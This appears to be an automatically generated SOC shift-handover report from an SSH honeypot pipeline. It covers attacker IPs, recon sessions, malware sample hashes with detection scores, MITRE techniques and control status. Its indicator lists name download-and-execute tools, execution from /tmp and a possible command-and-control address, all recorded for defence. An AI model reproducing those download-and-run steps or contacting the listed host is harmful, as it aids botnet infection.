| **First Seen** | 2026-07-03 18:52 |
| **Last Seen** | 2026-07-03 18:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:52:20` | `cowrie.session.connect` |
| `2026-07-03 18:52:20` | `cowrie.client.version` |
| `2026-07-03 18:52:20` | `cowrie.client.kex` |
| `2026-07-03 18:52:20` | `cowrie.login.success` |
| `2026-07-03 18:52:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c00c38d6527a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-03 18:52 |
| **Last Seen** | 2026-07-03 18:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:52:20` | `cowrie.session.connect` |
| `2026-07-03 18:52:20` | `cowrie.client.version` |
| `2026-07-03 18:52:20` | `cowrie.client.kex` |
| `2026-07-03 18:52:20` | `cowrie.login.success` |
| `2026-07-03 18:52:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.180.69[.]136` | **12** | 2026-07-03 16:58 | 2026-07-03 18:08 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **9** | 2026-07-03 16:55 | 2026-07-03 18:51 | 11m | 0 | `T1592` | 🟢 LOW |
| `115.191.22[.]87` | **2** | 2026-07-03 17:56 | 2026-07-03 17:58 | 2m | 0 | `T1592` | 🟢 LOW |
| `120.232.177[.]187` | **2** | 2026-07-03 18:34 | 2026-07-03 18:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.48.54[.]170` | **2** | 2026-07-03 17:13 | 2026-07-03 17:15 | 4m | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | **2** | 2026-07-03 17:43 | 2026-07-03 17:53 | 2m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]186` | **2** | 2026-07-03 18:35 | 2026-07-03 18:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]121` | **2** | 2026-07-03 17:54 | 2026-07-03 17:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **2** | 2026-07-03 17:58 | 2026-07-03 18:29 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.96.199[.]69` | 1 | 2026-07-03 17:04 | 2026-07-03 17:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]232` | 1 | 2026-07-03 17:13 | 2026-07-03 17:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.181[.]34` | 1 | 2026-07-03 17:04 | 2026-07-03 17:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-03 18:18 | 2026-07-03 18:18 | 1s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-03 18:39 | 2026-07-03 18:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]90` | 1 | 2026-07-03 18:08 | 2026-07-03 18:08 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 42/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 77/100 | 🔴 HIGH | **19/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `223.84.239[.]151` | CN | China Mobile Communications Corporation | **100** ⚠️ | 11 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `115.191.22[.]87` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 24 |
| `103.100.208[.]168` | HK | YISU CLOUD LTD | **100** ⚠️ | 7 |
| `168.76.131[.]178` | HK | Free State Education Department | **100** ⚠️ | 50 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `196.189.155[.]89` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `64.225.17[.]153` | US | DigitalOcean, LLC | **100** ⚠️ | 18 |
| `107.180.69[.]136` | US | GoDaddy.com, LLC | **100** ⚠️ | 12 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 69 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 57 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 2 |

---

## 🔕 False Positive Summary (75 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 1 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 70 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 173 cases |
| Tool 34  | Credential Extractor        | ✅ 87 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 39 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 75 filtered (43.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 31 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 57 priority case(s) shown individually · 15 recon entry/entries in table (9 group(s) consolidating 35 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-03T19:35:58Z_
